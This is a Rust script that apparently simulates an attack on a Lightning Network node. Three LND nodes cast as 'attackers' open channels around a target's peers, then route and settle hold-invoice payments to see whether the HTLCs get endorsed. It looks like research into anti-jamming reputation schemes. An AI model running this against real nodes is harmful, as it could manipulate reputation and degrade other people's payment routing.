use tokio::time::{sleep, Duration};

mod attack;
mod client;

// Alice
const LND_0_RPCSERVER: &str = env!("LND_0_RPCSERVER");
const LND_0_CERT: &str = env!("LND_0_CERT");
const LND_0_MACAROON: &str = env!("LND_0_MACAROON");

// Bob
const LND_1_RPCSERVER: &str = env!("LND_1_RPCSERVER");
const LND_1_CERT: &str = env!("LND_1_CERT");
const LND_1_MACAROON: &str = env!("LND_1_MACAROON");

// Charlie
const LND_2_RPCSERVER: &str = env!("LND_2_RPCSERVER");
const LND_2_CERT: &str = env!("LND_2_CERT");
const LND_2_MACAROON: &str = env!("LND_2_MACAROON");

const TARGET: &str = env!("TARGET");

#[tokio::main]
async fn main() {
    let mut alice = client::new_client(LND_0_RPCSERVER, LND_0_CERT, LND_0_MACAROON)
        .await
        .unwrap();
    let mut bob = client::new_client(LND_1_RPCSERVER, LND_1_CERT, LND_1_MACAROON)
        .await
        .unwrap();

    let mut charlie = client::new_client(LND_2_RPCSERVER, LND_2_CERT, LND_2_MACAROON)
        .await
        .unwrap();

    let target_peers = alice.graph_get_node_peers(TARGET.to_string()).await;

    let front_peer = &target_peers[0];
    let back_peer = &target_peers[1];

    // have two front-attackers (A & C) open channels to the target
    attack::open_to_targets(&mut alice, vec![front_peer.clone()])
        .await
        .unwrap();

    attack::open_to_targets(&mut charlie, vec![front_peer.clone()])
        .await
        .unwrap();

    // The back-attacker (B) opens a channel to the third target
    attack::open_to_targets(&mut bob, vec![back_peer.clone()])
        .await
        .unwrap();

    println!("Please confirm the channels!");
    std::io::stdin().read_line(&mut String::new()).unwrap();

    let hash_table = client::gen_hash_table(10);

    for (i, (preimage, hash)) in hash_table.iter().enumerate() {
        println!("generating invoice...");
        let invoice = bob.add_hold_invoice(hash.to_vec(), 1000).await;
        println!("sending payment...");
        alice.send_payment(invoice.to_string()).await;
        println!("payment sent! settling invoice...");
        sleep(Duration::from_secs(3)).await;
        bob.settle_invoice(preimage.to_vec()).await;
        // prints whether the inbound htlcs to pay that invoice were endorsed
        bob.lookup_invoice(hash.to_vec()).await;
        println!("settled invoice: {}, {}", i, hex::encode(hash));
    }
}
